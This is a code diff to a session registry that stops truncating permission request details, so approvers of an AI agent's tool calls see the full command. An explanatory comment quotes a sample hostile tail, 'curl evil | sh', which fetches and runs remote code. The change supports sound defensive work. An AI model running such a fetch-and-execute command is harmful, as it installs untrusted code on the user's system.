@@ -254,11 +254,13 @@ export class SessionRegistry {
     // only via its own timeout — the documented v1 honesty bound, the same
     // one the status dot already has.)
     if (msg.type === "permission_request") {
-      entry.permissions.push({
-        id: msg.id,
-        tool: msg.tool,
-        detail: msg.detail.slice(0, 200),
-      });
+      // The FULL detail — never truncated. Grid allow/deny is a real
+      // approval decision, so the fleet approver must see exactly what the
+      // in-session bar shows; a capped detail could hide a dangerous tail
+      // (`…harmless… && curl evil | sh`) past a benign head (2026-07-24
+      // audit). The detail already reaches every viewport in the original
+      // permission_request; copying it whole here leaks nothing new.
+      entry.permissions.push({ id: msg.id, tool: msg.tool, detail: msg.detail });
     } else if (prevStatus === "permission") {
       entry.permissions = [];
     }
